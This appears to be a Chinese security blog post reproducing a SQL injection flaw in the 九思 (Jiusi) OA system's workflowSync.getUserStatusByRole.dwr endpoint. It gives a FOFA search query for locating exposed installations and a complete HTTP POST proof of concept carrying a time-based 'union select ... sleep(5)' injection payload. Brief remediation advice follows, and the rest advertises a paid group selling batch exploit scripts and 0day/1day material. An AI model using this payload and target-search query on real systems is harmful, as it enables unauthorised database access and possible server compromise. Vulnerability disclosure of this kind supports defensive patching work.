#  「漏洞复现」九思OA workflowSync.getUserStatusByRole.dwr SQL注入漏洞   
冷漠安全  冷漠安全   2024-12-02 00:03  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
北京九思协同办公软件专业版是面向高端集团企业、多元化集团企业、大型企业的协同办公OA管理软件，由协同工作、工作流程、公共信息、知识管理、外部邮件、人事基础信息管理、门户应用和办理中心等模块组成，iThink协同办公集团OA软件专业版为企业解决了办公自动化管理的核心需求，实现企业内部知识、市场、销售、研发、人事、行政等方面的协同管理，通过iThink协同办公集团OA软件信息的高度共享和各种业务的流程化，及灵活高效的管理运营模式，使企业通过协同办公集团OA系统的应用环境迅速提升管理水平和运作效率。  
  
0x03  
  
**漏洞威胁**  
  
北京九思协同办公软件 /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
app="九思软件-OA"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pcibFyqkupKeJGvgmu0RZvnMeia3TaicHxwQqI3P2Kjte89ojacD5lIrMLSZdfnRbHVrAYeXl0wIaiaA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
POST /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close


callCount=1
c0-scriptName=workflowSync
c0-methodName=getUserStatusByRole
c0-id=1
c0-param0=string:1
c0-param1=string:1 union select 0,sleep(5)#
xml=true
```  
  
延时  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pcibFyqkupKeJGvgmu0RZvn4OUpC1jnLFnKRG6aodzNNY7t4TgBt11qO4NyCAPdg5ibSibpgTic6cDuQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pcibFyqkupKeJGvgmu0RZvnzcKDf0DDKrZgSZuicCHx0XUwO1wCYzAocOM0HXneibicicosTKicaUeLZ0g/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
对用户传入的参数进行限制。  
  
通过防火墙等安全设备设置访问策略，设置白名单访问。  
  
如非必要，禁止公网访问该系统。  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pcibFyqkupKeJGvgmu0RZvnxYw4KjAVnZO1ApicIfxjUQXtgx5F7MhXXMObk8ulibRTDjsXxNjh9SzQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pcibFyqkupKeJGvgmu0RZvnpv8epv6wjj6YapRic4Ixwttia4nuuQnGI9vHGd11iaF9VFRkmP0dLSt9w/640?wx_fmt=gif&from=appmsg "")  
  
  
